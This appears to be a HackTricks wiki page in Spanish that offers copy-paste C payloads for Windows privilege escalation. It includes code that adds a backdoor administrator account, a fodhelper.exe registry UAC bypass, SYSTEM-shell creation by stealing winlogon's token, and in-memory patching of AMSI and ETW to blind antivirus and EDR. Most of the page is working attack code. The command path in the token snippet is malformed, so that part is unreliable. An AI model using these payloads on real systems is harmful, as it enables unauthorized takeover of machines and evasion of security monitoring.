# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Esta página recopila **fragmentos de C pequeños y autónomos** que son útiles durante la Escalación de Privilegios Local en Windows o post-explotación. Cada payload está diseñado para ser **amigable con copiar y pegar**, requiere solo la API de Windows / tiempo de ejecución de C, y se puede compilar con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Estos payloads asumen que el proceso ya tiene los privilegios mínimos necesarios para realizar la acción (por ejemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege`, o contexto de integridad media para un bypass de UAC). Están destinados a **entornos de red team o CTF** donde explotar una vulnerabilidad ha permitido la ejecución de código nativo arbitrario.

---

## Agregar usuario administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registro Hijack (Integridad Media → Alta)
Cuando se ejecuta el binario de confianza **`fodhelper.exe`**, consulta la ruta del registro a continuación **sin filtrar el verbo `DelegateExecute`**. Al plantar nuestro comando bajo esa clave, un atacante puede eludir UAC *sin* dejar un archivo en el disco.

*Ruta del registro consultada por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC mínimo que abre un `cmd.exe` elevado:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Probado en Windows 10 22H2 y Windows 11 23H2 (parches de julio de 2025). La elusión aún funciona porque Microsoft no ha corregido la falta de verificación de integridad en la ruta `DelegateExecute`.*

---

## Generar shell SYSTEM a través de duplicación de token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si el proceso actual tiene **ambos** privilegios `SeDebug` y `SeImpersonate` (típico en muchas cuentas de servicio), puedes robar el token de `winlogon.exe`, duplicarlo y comenzar un proceso elevado:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para una explicación más profunda de cómo funciona eso, consulta:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Parcheo de AMSI y ETW en Memoria (Evasión de Defensa)
La mayoría de los motores AV/EDR modernos dependen de **AMSI** y **ETW** para inspeccionar comportamientos maliciosos. Parchear ambas interfaces temprano dentro del proceso actual evita que los payloads basados en scripts (por ejemplo, PowerShell, JScript) sean escaneados.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*El parche anterior es local al proceso; iniciar un nuevo PowerShell después de ejecutarlo se llevará a cabo sin inspección de AMSI/ETW.*

---

## Referencias
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
